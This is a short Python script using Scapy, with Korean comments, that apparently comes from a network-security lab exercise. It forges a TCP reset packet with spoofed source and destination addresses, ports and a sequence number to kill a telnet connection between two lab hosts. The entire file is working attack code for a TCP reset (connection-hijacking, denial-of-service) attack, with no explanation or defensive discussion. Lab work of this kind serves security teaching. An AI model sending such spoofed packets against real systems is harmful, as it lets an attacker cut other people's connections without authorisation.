import sys
from scapy.all import *

print("Sending Reset Packet...")
IPLayer = IP(src="10.9.0.5", dst = "10.9.0.69") # 출발과 도착 IP 주소에 대해 IP 레이어 정의
TCPLayer = TCP(sport=52789, dport = 23, flags="R", seq = 2159590966) # 출발과 도착지의 포트,
                                    #리셋 플래그 지정, 패킷 시퀀스 번호 지정에 대한 TCP 레이어 정의
pkt = IPLayer / TCPLayer # IPLayer와 TCPLayer 결합하여 하나의 패킷 형성
ls(pkt)
send(pkt, iface='eth0', verbose=0) # 패킷 eth0으로 전송, 출력 정보 X